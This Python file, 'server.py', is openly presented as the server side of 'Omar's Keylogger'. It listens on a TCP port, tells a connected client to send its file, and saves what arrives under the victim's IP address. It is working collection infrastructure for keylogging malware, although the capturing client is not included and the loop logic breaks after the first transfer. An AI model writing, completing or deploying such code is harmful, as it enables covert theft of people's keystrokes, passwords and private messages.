# server.py
import socket
host = 'localhost'
port = 9999
print("Welcome to Omar's Keylogger!")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind((host, port))
    server_socket.listen()
    print(f"Server listening on {host}:{port}")
    conn, addr = server_socket.accept()
    with conn:
        while True:
            while True:
                resp = input("Would you like to receive the next version? y/n\n")
                if resp == "y" or resp=="Y":
                    print("Starting file sending process...")
                    conn.send(resp.encode())
                    break
                elif resp == "n" or resp == "N":
                    print("Waiting..")
                    continue
                else:
                    print("Wrong command.") # Give user the option to get the newest version or not.
            file_contents = b""
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                file_contents += data

            with open(f"{conn.getpeername()[0]}.txt", "wb") as f:
                f.write(file_contents)
            print(f"File received and saved as '{conn.getpeername()[0]}.txt'")
